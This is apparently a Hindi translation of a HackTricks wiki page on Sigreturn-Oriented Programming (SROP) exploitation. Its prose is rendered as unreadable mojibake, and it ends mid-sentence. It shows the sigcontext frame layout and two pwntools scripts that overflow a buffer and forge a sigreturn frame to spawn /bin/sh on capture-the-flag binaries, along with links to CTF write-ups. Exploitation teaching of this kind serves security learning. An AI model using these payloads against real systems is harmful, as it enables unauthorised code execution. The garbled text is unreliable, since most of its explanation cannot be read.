# SROP - ‡§∏‡§ø‡§ó‡§∞‡§ø‡§ü‡§∞‡•ç‡§®-‡§ì‡§∞‡§ø‡§è‡§Ç‡§ü‡•á‡§° ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ‡§ø‡§Ç‡§ó

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ö‡§ó‡§∞ ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§®, **The PEASS Family** ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>

## ‡§Æ‡•Ç‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

**`Sigreturn`** ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ **‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤** ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§â‡§™‡§Ø‡•ã‡§ó ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§ï‡•á ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§∏‡§´‡§æ‡§à ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤‡•ç‡§∏ ‡§è‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•ã ‡§ë‡§™‡§∞‡•á‡§ü‡§ø‡§Ç‡§ó ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§≠‡•á‡§ú‡•á ‡§ó‡§è ‡§µ‡§ø‡§ò‡§ü‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•Ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ï‡•ç‡§∏‡§∞ ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§ú‡§¨ ‡§è‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§è‡§ï ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§µ‡§π ‡§Ö‡§™‡§®‡•á ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡•ã ‡§∞‡•ã‡§ï ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§µ‡§π ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§ï‡§æ ‡§∏‡§Æ‡§æ‡§ö‡§æ‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡•á, ‡§ú‡•ã ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§ï‡•ã ‡§∏‡§Ç‡§¨‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§°‡§ø‡§ú‡§º‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§π‡•à‡•§

‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•ã **‡§™‡§ø‡§õ‡§≤‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§™‡•Å‡§®‡§É ‡§Ü‡§∞‡§Ç‡§≠** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§ï‡•Å‡§õ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•Å‡§Ü ‡§π‡•à‡•§ ‡§Ø‡§π‡§æ‡§Å **`sigreturn`** ‡§ï‡§æ‡§Æ ‡§Ü‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•ã **‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§∏‡•á ‡§µ‡§æ‡§™‡§∏ ‡§≤‡•å‡§ü‡§®‡•á** ‡§î‡§∞ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§´‡•ç‡§∞‡•á‡§Æ (‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•â‡§≤‡•ç‡§∏ ‡§î‡§∞ ‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§ö‡§∞) ‡§ï‡•ã ‡§∏‡§æ‡§´ ‡§ï‡§∞‡§ï‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ï‡•ã ‡§™‡•Å‡§®‡§∞‡•ç‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§

‡§∞‡•ã‡§ö‡§ï ‡§≠‡§æ‡§ó ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø **`sigreturn`** ‡§ï‡•à‡§∏‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ï‡•ã ‡§™‡•Å‡§®‡§∞‡•ç‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à: ‡§Ø‡§π **‡§∏‡§≠‡•Ä ‡§∏‡•Ä‡§™‡•Ä‡§Ø‡•Ç ‡§ï‡•á ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§∏‡•ç‡§ü‡•ã‡§∞** ‡§ï‡§∞‡§ï‡•á ‡§ê‡§∏‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ú‡§¨ ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§Ö‡§¨ ‡§î‡§∞ ‡§®‡§π‡•Ä‡§Ç ‡§¨‡•ç‡§≤‡•â‡§ï ‡§π‡•ã‡§§‡§æ ‡§π‡•à, **`sigreturn` ‡§á‡§® ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡•á ‡§™‡•â‡§™** ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§Ö‡§∏‡§≤ ‡§Æ‡•á‡§Ç ‡§∏‡•Ä‡§™‡•Ä‡§Ø‡•Ç ‡§ï‡•á ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§â‡§®‡§ï‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§™‡•Å‡§®‡§É ‡§∏‡•á‡§ü ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§∏‡•á ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§ï‡•ã ‡§π‡•à‡§Ç‡§°‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§ ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡•ç‡§µ‡§æ‡§á‡§Ç‡§ü‡§∞ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ (‡§Ü‡§∞‡§è‡§∏‡§™‡•Ä), ‡§ú‡•ã ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§∂‡•Ä‡§∞‡•ç‡§∑ ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§§‡§æ ‡§π‡•à, ‡§≠‡•Ä ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡•§

{% hint style="danger" %}
‡§è‡§ï ‡§Ü‡§∞‡§ì‡§™‡•Ä ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§∏‡•á ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ **`sigreturn`** ‡§ï‡•ã ‡§¨‡•Å‡§≤‡§æ‡§®‡§æ ‡§î‡§∞ **‡§∏‡•ç‡§ü‡•à‡§ï** ‡§Æ‡•á‡§Ç ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§π‡§Æ‡•á‡§Ç ‡§ö‡§æ‡§π‡§ø‡§è ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§Æ‡§æ‡§®** ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§π‡§Æ ‡§ö‡§æ‡§π‡•á‡§Ç‡§ó‡•á ‡§ï‡§ø ‡§Ø‡§π **‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§** ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§á‡§∏‡§≤‡§ø‡§è **‡§ï‡•â‡§≤** ‡§ï‡§∞‡•á‡§Ç ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ `execve` ‡§ï‡•á ‡§≤‡§ø‡§è `/bin/sh`‡•§
{% endhint %}

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§π ‡§è‡§ï **‡§∞‡•á‡§ü2‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•á ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞** ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§∞‡•á‡§ü2‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•ã ‡§¨‡•Å‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•à‡§∞‡§æ‡§Æ‡•ç‡§∏ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§Ü‡§∏‡§æ‡§® ‡§¨‡§®‡§æ‡§§‡§æ ‡§π‡•à:

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ï‡•Ç‡§ü‡§®‡•Ä‡§§‡§ø ‡§∏‡•á ‡§á‡§∏‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã ‡§Ø‡§π ‡§π‡•à **‡§∏‡§ø‡§ó‡§ï‡•â‡§®‡•ç‡§ü‡•á‡§ï‡•ç‡§∏‡•ç‡§ü ‡§∏‡§Ç‡§∞‡§ö‡§®‡§æ** ‡§ú‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡§ø‡§§ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§¨‡§æ‡§¶ ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á (‡§°‡§æ‡§Ø‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡•á [**‡§Ø‡§π‡§æ‡§Å**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
## ‡§â‡§¶‡§æ‡§π‡§∞‡§£

‡§Ü‡§™ [**‡§Ø‡§π‡§æ‡§Å ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) ‡§ú‡§π‡§æ‡§Å ‡§∏‡§æ‡§á‡§®‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§ï‡•â‡§≤ ROP ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§®‡§ø‡§∞‡•ç‡§Æ‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à (rxa ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§® `0xf` ‡§°‡§æ‡§≤‡§®‡§æ), ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§π‡§æ‡§Å ‡§∏‡•á ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§â‡§§‡•ç‡§™‡•Ä‡§°‡§º‡§® ‡§π‡•à:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
‡§Ø‡§π‡§æ‡§Å ‡§∏‡•á [**‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§≠‡•Ä ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) ‡§ú‡§π‡§æ‡§Å ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§π‡•Ä `sigreturn` ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§•‡§æ ‡§î‡§∞ ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏‡•á **ROP** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§î‡§∞ ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§Ö‡§∏‡•á‡§Æ‡•ç‡§¨‡§≤‡•Ä ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§î‡§∞ ‡§´‡§ø‡§∞ **`sigreturn`** ‡§∏‡§ø‡§∏‡§ï‡•â‡§≤ ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ [**ret2syscall**](rop-syscall-execv/) ‡§≤‡§ø‡§ñ‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§è‡§ï **sigreturn** ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§ö‡§∞ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§î‡§∞ ‡§´‡•ç‡§≤‡•à‡§ó ‡§™‡§¢‡§º‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡•ã ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•Ä ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§π‡•à‡•§
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§Ö‡§∏‡•á‡§Æ‡•ç‡§¨‡§≤‡•Ä ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§î‡§∞ ‡§´‡§ø‡§∞ **`sigreturn`** ‡§∏‡§ø‡§∏‡§ï‡•â‡§≤ ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ [**ret2syscall**](rop-syscall-execv/) ‡§≤‡§ø‡§ñ‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§è‡§ï **sigreturn** ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§ö‡§∞ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á (‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó `/bin/sh` ‡§π‡•à)‡•§
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 ‡§¨‡§ø‡§ü, ‡§ï‡•ã‡§à relro ‡§®‡§π‡•Ä‡§Ç, ‡§ï‡•ã‡§à ‡§ï‡•à‡§®‡•á‡§∞‡•Ä ‡§®‡§π‡•Ä‡§Ç, ‡§è‡§®‡§è‡§ï‡•ç‡§∏, ‡§ï‡•ã‡§à ‡§™‡§æ‡§à‡•§ `gets` ‡§´‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§∏‡§ø‡§Æ‡•ç‡§™‡§≤ ‡§¨‡§´‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ú‡•ã [**ret2syscall**](rop-syscall-execv/) ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ROP ‡§ö‡•á‡§® `.bss` ‡§Æ‡•á‡§Ç `/bin/sh` ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§´‡§ø‡§∞ ‡§∏‡•á gets ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§ï‡•á ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§Ø‡§π **`alarm`** ‡§´‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø eax ‡§ï‡•ã `0xf` ‡§∏‡•á‡§ü ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï **SROP** ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§∂‡•à‡§≤ ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§è‡§Ç‡•§
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 ‡§¨‡§ø‡§ü ‡§Ö‡§∏‡•á‡§Æ‡•ç‡§¨‡§≤‡•Ä ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ, ‡§ï‡•ã‡§à relro ‡§®‡§π‡•Ä‡§Ç, ‡§ï‡•ã‡§à ‡§ï‡•à‡§®‡•á‡§∞‡•Ä ‡§®‡§π‡•Ä‡§Ç, ‡§è‡§®‡§è‡§ï‡•ç‡§∏, ‡§ï‡•ã‡§à ‡§™‡§æ‡§à‡•§ ‡§´‡•ç‡§≤‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§ï‡§à ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§è‡§ï ‡§∏‡§ø‡§∏‡§ï‡•â‡§≤ ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ `exit` ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ö‡§Ø‡§®‡§ø‡§§ ‡§∏‡§ø‡§∏‡§ï‡•â‡§≤ ‡§è‡§ï `sigreturn` ‡§π‡•à 